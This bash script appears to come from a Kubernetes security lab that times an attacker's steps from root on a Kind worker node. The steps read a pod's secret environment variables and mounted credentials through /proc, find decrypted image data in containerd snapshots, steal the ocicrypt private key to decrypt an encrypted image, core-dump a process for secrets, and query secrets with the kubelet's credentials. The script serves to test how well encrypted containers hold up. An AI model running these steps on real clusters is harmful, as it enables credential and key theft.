#!/usr/bin/env bash
# Attacker with root on supply-worker (docker exec into the Kind node is the
# same as a root shell on a real node). Each step is timed and its output saved.
set -uo pipefail
source "$(dirname "$0")/lib.sh"
OUT="$LAB/results/node-root"; mkdir -p "$OUT"
N=supply-worker
kubectl apply -f "$LAB/manifests/victim.yaml" >/dev/null
kubectl -n enc wait --for=condition=Ready pod/victim --timeout=120s >/dev/null
echo -e "step\tms\tlast-line-of-output" > "$OUT/steps.tsv"
step() { # step NAME 'shell run as root inside the node'
  local name=$1; shift; local t0 t1 out
  t0=$(date +%s%N); out=$(docker exec "$N" sh -c "$*" 2>&1); t1=$(date +%s%N)
  printf '$ %s\n%s\n' "$*" "$out" > "$OUT/$name.txt"
  printf '%s\t%s\t%s\n' "$name" "$(( (t1-t0)/1000000 ))" "$(echo "$out" | tail -1 | cut -c1-120)" | tee -a "$OUT/steps.tsv"
}

CID='$(crictl ps -q --label io.kubernetes.pod.name=victim --name app)'
PID="\$(crictl inspect --output go-template --template '{{.info.pid}}' $CID)"
step 01-find-process "echo pid=$PID"
step 02-env "tr '\\0' '\\n' < /proc/$PID/environ | grep APP_SECRET"
step 03-secret-volume "cat /proc/$PID/root/var/run/creds/password; echo; ls -d /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/creds; df -h /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/creds | tail -1"
step 04-decrypted-rootfs "head -c 31 /proc/$PID/root/opt/model/model.bin; echo"
SNAP=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots
step 05-snapshot-on-disk "for f in $SNAP/*/fs/opt/model/model.bin; do echo \$f; head -c 31 \$f; echo; done"
step 06-steal-key "ls -l /etc/containerd/ocicrypt/keys; head -1 /etc/containerd/ocicrypt/keys/enc-priv.pem"

# Steps on the attacker's own machine (here the VM host, which is also root
# over the Kind node containers).
hstep() {
  local name=$1; shift; local t0 t1 out
  t0=$(date +%s%N); out=$(bash -c "$*" 2>&1); t1=$(date +%s%N)
  printf '$ %s\n%s\n' "$*" "$out" > "$OUT/$name.txt"
  printf '%s\t%s\t%s\n' "$name" "$(( (t1-t0)/1000000 ))" "$(echo "$out" | tail -1 | cut -c1-120)" | tee -a "$OUT/steps.tsv"
}
W=$(mktemp -d)
docker exec "$N" cat /etc/containerd/ocicrypt/keys/enc-priv.pem > "$W/stolen.pem"
hstep 07-decrypt-stolen-copy "skopeo copy -q --src-tls-verify=false --decryption-key $W/stolen.pem docker://kind-registry:5000/demo/app-enc:v1 dir:$W/dec && for b in $W/dec/*; do gzip -dc \$b 2>/dev/null; done | grep -a -c PROPRIETARY-MODEL-MARKER"
HPID=$(for p in $(pgrep -x demoapp); do sudo grep -qa env-secret-value-77aa /proc/$p/environ 2>/dev/null && echo $p; done | head -1)
hstep 08-gcore "sudo gcore -o $W/core $HPID >/dev/null 2>&1; sudo strings -a $W/core.$HPID | grep -c env-secret-value-77aa"

# The kubelet's own credentials: what can the node identity read?
KC='kubectl --kubeconfig /etc/kubernetes/kubelet.conf'
step 09-kubelet-secret-mounted "$KC -n enc get secret db-creds -o jsonpath='{.data.password}' | base64 -d; echo"
step 10-kubelet-secret-unmounted "$KC -n enc get secret unrelated-secret 2>&1 | tail -1"
step 11-kubelet-list-secrets "$KC get secrets -A 2>&1 | tail -1"

# Plaintext survives the pod: delete it, look on disk again.
kubectl -n enc delete pod victim --wait=true >/dev/null
step 12-after-pod-delete "for f in $SNAP/*/fs/opt/model/model.bin; do echo \$f; head -c 31 \$f; echo; done"
sudo rm -rf "$W"
